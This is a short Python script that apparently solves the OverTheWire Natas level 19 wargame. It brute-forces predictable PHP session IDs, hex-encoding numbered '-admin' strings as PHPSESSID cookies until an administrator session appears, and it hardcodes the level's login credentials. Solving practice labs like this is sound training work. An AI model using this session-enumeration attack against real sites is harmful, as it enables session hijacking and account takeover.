import requests

url = "http://natas19.natas.labs.overthewire.org/"
auth_username = "natas19"
auth_password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
user_str = "You are logged in as a regular user."

for i in range(1,641):
	phpvar = (str(i)+'-admin').encode("utf-8").hex()
	cookies = dict(PHPSESSID=phpvar)
	r = requests.get(url, auth=(auth_username, auth_password), cookies=cookies)
	if user_str in r.text:
		print ("Attempt ", phpvar, " is not admin!")

	else:
		print ("Attempt ", phpvar, " IS ADMIN!")
		print (r.content)
		break
